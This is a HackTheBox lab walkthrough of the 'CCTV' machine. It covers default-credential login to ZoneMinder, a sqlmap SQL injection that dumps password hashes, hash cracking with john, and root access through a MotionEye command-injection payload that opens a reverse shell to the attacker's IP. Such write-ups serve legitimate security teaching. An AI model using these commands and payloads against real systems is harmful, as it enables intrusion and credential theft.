+++
title = "CCTV - Exploiting outdated services with SQL injection"
date = 2026-05-15T16:20:18Z
tags = ["HTB - Easy", "Linux", "Pentesting"]
description = "Pwning the CCTV machine from HTB."
+++
## **OVERVIEW**
*CCTV* is an easy-rated Linux machine on the HackTheBox platform. Hacking into the machine requires SQL injection to extract passwords from a database, cracking password hashes to gain a foothold on the machine, and privilege escalation through RCE.
## **RECON**
After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nmap -sS -oN nmap_scan.txt 10.129.7.141                     
```
The scan revealed two open TCP ports for SSH and HTTP (a stealth scan was necessary to stop the machine from crashing).
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-27 11:19 PDT
Nmap scan report for 10.129.7.141
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.00 seconds
```
Next, I went to visit the target's IP in a web browser to see what pops up. I found the domain name, **cctv.htb**, and after adding it to my **/etc/hosts** file, I was able to find this webpage:
![cctv landing page](/images/cctv/homepage.png)
The website seemed to be hosting a security camera monitoring service. On the surface, there wasn't anything on the site that stood out to me, so I went ahead and began enumerating.
## **ENUMERATION**
I searched the site for endpoints using gobuster and fuzzed the URL for subdomains but came up with nothing. The only other endpoint that was worth digging into was **http://cctv.htb/zm/**, which was hyperlinked to the *Staff Login* button on the home page.  
&nbsp;  
The page was just a bare-bones login form, but it was used to connect to a service called **ZoneMinder**.
![zoneminder login page](/images/cctv/zoneminder.png)
My first instict was to try default credentials, so I typed in **admin** for both the username and password. To my surprise, I was able to get in first try! (As it turns out, those creds are used by default for ZoneMinder)  
&nbsp;  
The dashboard looked something like this:
![dashboard for zoneminder](/images/cctv/dashboard.png)
Not so interesting at first glance. But very revealing, because the version number is in bright yellow letters on the right hand side---  
&nbsp;  
**v1.37.63**  
&nbsp;  
I kept this in mind and went through the rest of the site searching for anything I could leverage to pop a shell. In the **Options** tab under **Users**, I was able to find two other users on the target, **mark** and **superadmin**.  
&nbsp;  
Other than that, the rest of the options didn't seem like attack vectors. So, I went back to the version number and got straight to searching for known vulnerabilities. After doing some digging, I came across this vulnerable URL endpoint on GitHub that can be exploited using **sqlmap**:
```bash
sqlmap -u http://hostname_or_ip/zm/index.php?view=request&request=event&action=removetag&tid=1
```
I modified the command for my target machine, and also added a **cookie** flag to use the **ZoneMinder session ID** from my unprivileged account. I targeted the **zm** database and **Users** table and dumped the data to my attacking machine:  
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
--cookie "ZMSESSID=5hbje44ebg6n3n0s61f0bhbr6a" \
-D zm -T Users --dump
```
The output got saved into a **Users.csv** file, which contained the following credentials:  
```bash
┌──(root㉿kali)-[~/…/output/cctv.htb/dump/zm]
└─# cat Users.csv
Username,Password
superadmin,$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark,$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
admin,$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```
All I had to do now was crack the password hashes!  
&nbsp;  
The format of the hashes were bcrypt, with a cost factor of 10. I attempted to crack them using the **john the ripper** tool and the **rockyou.txt** password list:
```bash
──(root㉿kali)-[/home/esteban/HackTheBox]
└─# john hash.txt --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
opensesame       (?)     
1g 0:00:00:26 DONE (2026-05-28 18:46) 0.03742g/s 223.6p/s 223.6c/s 223.6C/s cristhian..tuyyo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
The cracked password above is for the user **mark**, whose password I attempted to crack first. Trying to run john against the **superadmin** user went on for way too long, so I gave up on trying to crack that and instead used the **mark** user to SSH into the target machine.  
## **FOOTHOLD**
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# ssh mark@cctv.htb
mark@cctv.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 29 May 01:49:37 UTC 2026

  System load:           0.0
  Usage of /:            79.0% of 8.70GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             252
  Users logged in:       0
  IPv4 address for eth0: 10.129.9.47
  IPv6 address for eth0: dead:beef::a0de:adff:fe4d:d6c3

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

144 updates can be applied immediately.
94 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

15 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
mark@cctv:~$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev) 
```  
After popping a shell as **mark** on the target machine, I realized that I was a very low-privileged user. I couldn't access the **user.txt** flag, as it wasn't located in **mark**'s home directory, but on a *different* user named **sa_mark** (which I assume stands for *superadmin* mark).  
&nbsp;  
My current user didn't have any capabilities or SUID binaries that could be leveraged for privilege escalation. So, I decided to check for any running TCP services on the target that I didn't know about:
```bash
mark@cctv:~$ ss -tlnp
State  Recv-Q Send-Q  Local Address:Port    Peer Address:Port Process                                                       
LISTEN 0      4096    127.0.0.53%lo:53           0.0.0.0:*                                                                  
LISTEN 0      70          127.0.0.1:33060        0.0.0.0:*                                                                  
LISTEN 0      4096        127.0.0.1:8554         0.0.0.0:*                                                                  
LISTEN 0      128         127.0.0.1:8765         0.0.0.0:*                                                                  
LISTEN 0      4096        127.0.0.1:8888         0.0.0.0:*                                                                  
LISTEN 0      4096        127.0.0.1:9081         0.0.0.0:*                                                                  
LISTEN 0      151         127.0.0.1:3306         0.0.0.0:*                                                                  
LISTEN 0      4096       127.0.0.54:53           0.0.0.0:*                                                                  
LISTEN 0      4096          0.0.0.0:22           0.0.0.0:*                                                                  
LISTEN 0      4096        127.0.0.1:7999         0.0.0.0:*                                                                  
LISTEN 0      4096        127.0.0.1:1935         0.0.0.0:*                                                                  
LISTEN 0      511                 *:80                 *:*                                                                  
LISTEN 0      4096             [::]:22              [::]:* 
```
I used the **curl -sv** command on each of the ports to see if there were any interesting ones, and ended up hitting big on port **8765**.  
As it turns out, this port is commonly used by the **MotionEye** service, a local web-based GUI for monitoring security cameras.  
&nbsp;  
I went back to my attacker machine's terminal and used SSH to tunnel a connection from the target machine to my own:  
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# ssh -L 9999:127.0.0.1:8765 mark@cctv.htb
```
I was then able to visit the **MotionEye** panel by opening up a web browser and navigating to **http://localhost:9999**
![image of motioneye dashboard](/images/cctv/motioneye.png)
I attempted to sign in with the credentials I used for **mark** on the target machine, but got denied. I then tried entering in default admin credentials, but still had no luck.  
&nbsp;  
So, I went back to the terminal I had open on the target machine and searched for any directories that could be related to **MotionEye** in the hopes of finding credentials.
```bash
mark@cctv:/$ find / -name "motioneye" 2>/dev/null
/run/motioneye
/var/lib/motioneye
/var/log/motioneye
/etc/motioneye
/usr/local/lib/python3.12/dist-packages/motioneye
```
I looked through the list of directories that came up and ended up finding plaintext credentials in **/etc/motioneye**!
```bash
mark@cctv:/etc/motioneye$ ls
camera-1.conf  motion.conf  motioneye.conf
mark@cctv:/etc/motioneye$ cat motion.conf 
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```
I went back to the admin panel in my web browser and tried out the admin credentials from the **motion.conf** file I found and was able to get succesfully logged in!
![successful login to motioneye](/images/cctv/motioneye2.png)
From here, I explored the site to see if there were any vulnerabilities out in the open. I knew that if the **MotionEye** service was running as **root**, getting RCE would be the last step to pwning the machine.  
&nbsp;  
By exploring the settings tab, I found the **version** that MotionEye was running. This was huge, because after doing some digging online, I came across a **severe** vulnerability that allowed RCE from the admin panel I was running on. This [**GitHub advisory**](https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx) post explains the vulnerability in detail, along with a PoC.  
&nbsp;  
Essentially, all an attacker has to do is:  
&nbsp;  
Bypass client-side validation by manipulating a JS file in their browser:  
![bypassing client-side validation](/images/cctv/clientside.png)
Then inject a payload into one of the MotionEye "Still Image" settings:  
![injecting payload](/images/cctv/payload.png)
The payload used in order to get a reverse shell was:
```bash
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.16.192/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```  
## **PRIVESC**  
All that was left to do was set up a listener on my target machine:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nc -lvnp 4444  
listening on [any] 4444 ...
```
Then, hit **Apply** on the MotionEye admin panel:
![hitting apply on the motioneye admin panel](/images/cctv/apply.png)
After that, the rest was history.  
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.10.16.192] from (UNKNOWN) [10.129.9.47] 40052
bash: cannot set terminal process group (3813): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye# 
```
I went ahead and grabbed the **user.txt** flag from **/home/sa_mark**:
```bash
root@cctv:~# cd /home/sa_mark
root@cctv:/home/sa_mark# cat user.txt
245cfe65658229952c84b0c7af1770ca
```
And the **root.txt** flag from **/root**:
```bash
root@cctv:/home/sa_mark# cd /root
root@cctv:~# cat root.txt
4c330148025f5e90d7ce83ec72eb9b2a
```
## **TAKEAWAYS**
This machine highlighted the importance of keeping web services up to date and keeping credentials hashed. Since the ZoneMinder version was easily exploitable with SQL injection, extracting and cracking password hashes was easy. To make it worse, the MotionEye version running on the machine was also outdated, allowing for remote code execution *and* a root shell.